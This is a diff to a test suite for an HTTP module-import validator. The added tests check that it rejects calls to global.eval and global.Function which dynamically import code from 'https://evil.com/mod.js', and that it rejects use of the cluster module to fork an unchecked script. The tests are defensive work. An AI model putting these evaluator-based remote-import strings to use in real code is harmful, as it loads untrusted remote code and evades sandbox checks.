@@ -284,6 +284,28 @@ describe("routing/api/module-loader/http-validator", () => {
       );
     });
 
+    it("should recognize the Node global alias without ignoring local shadowing", async () => {
+      for (
+        const source of [
+          `global.eval('import("https://evil.com/mod.js")');`,
+          `global.Function('return import("https://evil.com/mod.js")')();`,
+        ]
+      ) {
+        await assertRejects(
+          async () => await validateHTTPImports(source, []),
+          Error,
+          "dynamic code generation",
+          "Node global aliases must retain the global evaluator capability",
+        );
+      }
+
+      await validateHTTPImports(
+        `const global = { Function: () => "local", eval: () => "local" };` +
+          ` export const GET = () => new Response(global.Function() + global.eval());`,
+        [],
+      );
+    });
+
     it("should reject reflective retrieval of a dynamic code generator", async () => {
       await assertRejects(
         async () =>
@@ -1123,6 +1145,19 @@ describe("routing/api/module-loader/http-validator", () => {
           Error,
           "subprocess module loading",
           `${moduleName} can launch a runtime outside the checked module graph`,
+        );
+      }
+      for (const moduleName of ["node:cluster", "cluster"]) {
+        await assertRejects(
+          async () =>
+            await validateHTTPImports(
+              `import cluster from "${moduleName}";` +
+                ` cluster.setupPrimary({ exec: "./unchecked.cjs" }); cluster.fork();`,
+              [],
+            ),
+          Error,
+          "subprocess module loading",
+          `${moduleName} can launch an unchecked runtime outside the module graph`,
         );
       }
     });
